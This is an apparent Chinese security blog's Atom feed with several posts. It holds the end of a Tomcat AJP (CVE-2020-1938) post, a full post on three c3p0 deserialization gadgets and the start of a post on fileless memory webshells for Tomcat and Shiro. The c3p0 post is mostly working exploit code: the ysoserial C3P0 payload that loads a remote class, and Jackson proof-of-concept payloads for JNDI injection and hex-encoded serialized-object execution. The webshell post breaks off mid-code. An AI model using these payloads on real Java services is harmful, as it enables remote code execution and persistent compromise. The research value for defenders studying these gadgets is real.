title="受影响版本"></a>受影响版本</h2><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>文中分析的是最理想的情况实际利用会受到过滤器或是框架的影响关于这部分内容可以看<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/">如何更加精确的检测Tomcat AJP文件包含漏洞(CVE-2020-1938)</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/7325">Tomcat Ajp协议文件包含漏洞分析</a><br><a href="https://xz.aliyun.com/t/7510">tomcat幽灵猫分析</a></p>]]></content>
    
    <summary type="html">
    
      漏洞原理本身很简单，值得学习的是tomcat运行的宏观流程，值得思考的是长亭的师傅是怎么挖到的。
    
    </summary>
    
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>c3p0的三个gadget</title>
    <link href="http://yoursite.com/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/"/>
    <id>http://yoursite.com/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/</id>
    <published>2020-04-18T03:14:34.000Z</published>
    <updated>2020-07-11T07:59:46.984Z</updated>
    
    <content type="html"><![CDATA[<!-- 除了常见的http base之外，在某些情况下c3p0可以使用jndi和hex序列化字节加载器来进行rce。 --><!-- more --><p>c3p0有三种方式getshell</p><ul><li>http base</li><li>jndi</li><li>hex序列化字节加载器</li></ul><p>http base适用于原生反序列化，后面两种适用于其他解组类型的反序列化。具体来讲，jndi适用于jdk8u191以下支持reference情况，hex序列化字节加载器适用于不出网但是目标依赖有gadget链的情况。</p><h2 id="http-base"><a href="#http-base" class="headerlink" title="http base"></a>http base</h2><p>c3p0 payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.PoolBackedDataSource;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * com.sun.jndi.rmi.registry.RegistryContext-&gt;lookup</span></span><br><span class="line"><span class="comment"> * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized-&gt;getObject</span></span><br><span class="line"><span class="comment"> * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase-&gt;readObject</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Arguments:</span></span><br><span class="line"><span class="comment"> * - base_url:classname</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Yields:</span></span><br><span class="line"><span class="comment"> * - Instantiation of remotely loaded class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( harness=<span class="string">"ysoserial.test.payloads.RemoteClassLoadingTest"</span> )</span><br><span class="line"><span class="meta">@Dependencies</span>( &#123; <span class="string">"com.mchange:c3p0:0.9.5.2"</span> ,<span class="string">"com.mchange:mchange-commons-java:0.2.11"</span>&#125; )</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.MBECHLER &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C3P0</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Command format is: &lt;base_url&gt;:&lt;classname&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String url = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        String className = command.substring(sep + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolSource</span> <span class="keyword">implements</span> <span class="title">ConnectionPoolDataSource</span>, <span class="title">Referenceable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String className;</span><br><span class="line">        <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PoolSource</span> <span class="params">( String className, String url )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.className = className;</span><br><span class="line">            <span class="keyword">this</span>.url = url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Reference(<span class="string">"exploit"</span>, <span class="keyword">this</span>.className, <span class="keyword">this</span>.url);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> PrintWriter <span class="title">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLoginTimeout</span> <span class="params">( <span class="keyword">int</span> seconds )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(C3P0<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>connectionPoolDataSource是PoolSource，但是PoolSource没有实现序列化接口，所以会在PoolBackedDataSource时进入到catch块中。<br><img src="1586157998304-98f88cb3-35d4-4b17-b735-a381447d3604.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&name=image.png&originHeight=596&originWidth=2822&size=175522&status=done&style=none&width=1411" alt="image.png"></p><p><img src="1586157880994-1fe1db61-f3a5-45a3-a591-4af5ef5cee26.png#align=left&display=inline&height=628&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1256&originWidth=1514&size=146157&status=done&style=none&width=757" alt="image.png"></p><p><img src="1586157739966-f17e2977-5809-47de-ae93-56a634a2ae63.png#align=left&display=inline&height=390&margin=%5Bobject%20Object%5D&name=image.png&originHeight=780&originWidth=2348&size=199375&status=done&style=none&width=1174" alt="image.png"></p><p>catch块中调用indirector.indirectForm(this.connectionPoolDataSource)会把Referenceable类型放到ReferenceSerialized中并进行序列化。<br><img src="1586158218862-65b4fe36-0548-40a6-9243-67d6716739ed.png#align=left&display=inline&height=350&margin=%5Bobject%20Object%5D&name=image.png&originHeight=700&originWidth=2474&size=144888&status=done&style=none&width=1237" alt="image.png"></p><p>在反序列化时，会调用ReferenceSerialized的getObject方法，向http base请求类<br><img src="1586158470733-c79c8427-b1d3-482d-8082-c8b9c4e4b3b1.png#align=left&display=inline&height=194&margin=%5Bobject%20Object%5D&name=image.png&originHeight=388&originWidth=2014&size=79716&status=done&style=none&width=1007" alt="image.png"></p><p><img src="1586158529333-efc7783e-8941-45de-9242-b6b5043e49a9.png#align=left&display=inline&height=485&margin=%5Bobject%20Object%5D&name=image.png&originHeight=970&originWidth=2208&size=195296&status=done&style=none&width=1104" alt="image.png"></p><p><img src="1586158599877-ad23b7dc-9541-416e-8563-ea92e0a0f47c.png#align=left&display=inline&height=387&margin=%5Bobject%20Object%5D&name=image.png&originHeight=774&originWidth=2164&size=167546&status=done&style=none&width=1082" alt="image.png"></p><h2 id="jndi-注入"><a href="#jndi-注入" class="headerlink" title="jndi 注入"></a>jndi 注入</h2><p>PoolBackedDataSourceBase<br><img src="1586157023673-1ba52779-d0e1-4e31-a9e3-a92873f39dfe.png#align=left&display=inline&height=470&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=2002&size=188137&status=done&style=none&width=1001" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatePoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String poc = <span class="string">"&#123;\"object\":[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",&#123;\"jndiName\":\"rmi://localhost:8088/Exploit\", \"loginTimeout\":0&#125;]&#125;"</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        objectMapper.readValue(poc, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] bArray, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            String sTemp = Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1586746951558-7748fb17-b819-4eaa-9aa9-edff94e8bd90.png#align=left&display=inline&height=243&margin=%5Bobject%20Object%5D&name=image.png&originHeight=486&originWidth=1944&size=127935&status=done&style=none&width=972" alt="image.png"></p><p><img src="1586747039311-88d990d3-4b87-4570-b33b-b32b0e9bbcd5.png#align=left&display=inline&height=256&margin=%5Bobject%20Object%5D&name=image.png&originHeight=512&originWidth=2204&size=101206&status=done&style=none&width=1102" alt="image.png"></p><p><img src="1586747042329-d08d3f11-8212-4e27-b5db-692d2fd316af.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&name=image.png&originHeight=488&originWidth=1320&size=68944&status=done&style=none&width=746" alt="image.png"></p><p><img src="1586747066747-72ba5789-3d66-407b-a184-8b672916fe76.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=560&originWidth=2200&size=145105&status=done&style=none&width=1100" alt="image.png"></p><h2 id="hex序列化字节加载器"><a href="#hex序列化字节加载器" class="headerlink" title="hex序列化字节加载器"></a>hex序列化字节加载器</h2><p><img src="1586157043057-ea21e78c-b10c-4f83-9dd5-198c1a5b6ae1.png#align=left&display=inline&height=451&margin=%5Bobject%20Object%5D&name=image.png&originHeight=902&originWidth=2004&size=179448&status=done&style=none&width=1002" alt="image.png"><br><img src="1586157060893-23a3eaed-43e6-43b6-89b5-21803abfe30f.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=670&originWidth=1976&size=153585&status=done&style=none&width=988" alt="image.png"></p><p>在一些非原生的反序列化（如jackson）的情况下，c3p0可以做到不出网利用。其原理是利用jackson的反序列化时调用userOverridesAsString的setter，在setter中运行过程中会把传入的以HexAsciiSerializedMap开头的字符串进行解码并触发原生反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatePoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        InputStream in = <span class="keyword">new</span> FileInputStream(<span class="string">"/Users/cengsiqi/Desktop/test.ser"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] data = toByteArray(in);</span><br><span class="line">        in.close();</span><br><span class="line">        String HexString = bytesToHexString(data, data.length);</span><br><span class="line">        String poc = <span class="string">"&#123;\"object\":[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",&#123;\"userOverridesAsString\":\"HexAsciiSerializedMap:"</span>+ HexString + <span class="string">";\"&#125;]&#125;"</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        objectMapper.readValue(poc, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] bArray, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            String sTemp = Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单跟踪一下，进入setter方法。<br><img src="1586744313296-ca6b14b1-4297-4f09-a344-563ba85cf168.png#align=left&display=inline&height=363&margin=%5Bobject%20Object%5D&name=image.png&originHeight=726&originWidth=2460&size=210573&status=done&style=none&width=1230" alt="image.png"></p><p>由parseUserOverridesAsString对字符串进行处理<br><img src="1586744361091-dae2b1e6-349a-4863-8c80-bcd9fe960f07.png#align=left&display=inline&height=1332&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1332&originWidth=2568&size=442605&status=done&style=none&width=2568" alt="image.png"></p><p>提取HexAsciiSerializedMap之后的东西<br><img src="1586744421955-161d66ba-096b-4df9-97a4-9bb506f94f07.png#align=left&display=inline&height=185&margin=%5Bobject%20Object%5D&name=image.png&originHeight=370&originWidth=2528&size=123596&status=done&style=none&width=1264" alt="image.png"></p><p>最后由fromByteArray中的deserializeFromByteArray进行反序列化<br><img src="1586744477494-4055d369-1a34-49f3-9836-091d4471928c.png#align=left&display=inline&height=100&margin=%5Bobject%20Object%5D&name=image.png&originHeight=200&originWidth=2244&size=67588&status=done&style=none&width=1122" alt="image.png"></p><p><img src="1586744495756-bf0a1af2-742b-49ad-90e5-e926633529be.png#align=left&display=inline&height=124&margin=%5Bobject%20Object%5D&name=image.png&originHeight=248&originWidth=2250&size=65436&status=done&style=none&width=1125" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      除了常见的http base之外，在某些情况下c3p0可以使用jndi和hex序列化字节加载器来进行rce。
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>tomcat不出网回显连续剧第六集</title>
    <link href="http://yoursite.com/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/"/>
    <id>http://yoursite.com/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/</id>
    <published>2020-04-09T06:43:48.000Z</published>
    <updated>2020-07-11T08:03:54.407Z</updated>
    
    <content type="html"><![CDATA[<!-- 离大结局又进了一步 --><!-- more --><p>首发于<a href="https://xz.aliyun.com/t/7535">先知社区</a></p><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>这周回顾了一下我看到的前人关于tomcat回显和无文件webshell的文章。发现各个师傅的方法各有优劣，下面简单总结一下（总结不对的地方还请各位师傅指出）。</p><ul><li><a href="https://www.anquanke.com/post/id/198886">基于内存 Webshell 的无文件攻击技术研究</a>，观星大哥的文章，通杀spring，能解决实战只能够遇到的大部分情况了。</li><li><a href="https://xz.aliyun.com/t/7348">Tomcat中一种半通用回显方法</a>，这篇文章讲了通过反射修改ApplicationFilterChain参数来让tomcat再下一次请求的时候在线程中缓存req和resp，不足之处在于shiro无法回显。</li><li><a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术</a>，通过上一篇的方法获取到req进一步获取context，然后动态注册filter，不足之处在于使用的是上一篇的获取req的思路所以也无法shiro回显。</li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a>，这篇文章通过currentThread.getContextClassLoader()获取StandardContext，进一步获取到response，解决了shiro回显的问题，不足在于tomcat7中无法获取到StandardContext。</li><li><a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">基于Tomcat无文件Webshell研究</a>，总结上面文章的方法，不足之处在于无法解决tomcat7+shiro的问题。</li></ul><p>所以这里提出一种新的回显方案解决一下tomcat7+shiro这个阴暗的角落（经测试tomcat8仍然适用）。<br>测试环境：macos+tomcat7,8+shiro-simple-web</p><h2 id="再看register"><a href="#再看register" class="headerlink" title="再看register"></a>再看register</h2><p>在上面提到的第四篇文章中提到包含有request（有了request就有response）的rp会被储存在global中，但其实再往下看会发现rp被注册进了组件。<br><img src="1585579573873-fde8907a-d8ea-4418-8fb8-4f2f24c5854b.png#align=left&display=inline&height=413&name=image.png&originHeight=826&originWidth=2868&size=245974&status=done&style=none&width=1434" alt="image.png"><br>既然注册进去了肯定存放在哪里的，接下来动静结合调代码找就好了，代码跟踪过于冗长而且我也没细细探究每一步的意义，就不装模作样的分析了，这里直接给结论。<br><img src="1585579952767-ef1b2c0c-0d84-4ec1-953f-89236110b0ab.png#align=left&display=inline&height=645&name=image.png&originHeight=1290&originWidth=2176&size=948160&status=done&style=none&width=1088" alt="image.png"></p><p>通过idea的计算功能我们可以符合直觉的拿到response，实际想获取还是需要各种反射的。tomcat7,8获取这条链的方式大同小异，变化之处在于<code>name=&quot;http-bio-8888&quot;,type=GlobalRequestProcessor</code>，其中8888是tomcat服务端端口，在tomcat8里面bio变为nio。关于<a href="https://blog.csdn.net/ClementAD/article/details/47045673">bio，nio的细节可以参考这篇文章</a>。</p><p>除此之外在实际场景下会有很多requests是要遍历processors中的各个requests。</p><h2 id="demo代码"><a href="#demo代码" class="headerlink" title="demo代码"></a>demo代码</h2><p>tomcat8的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 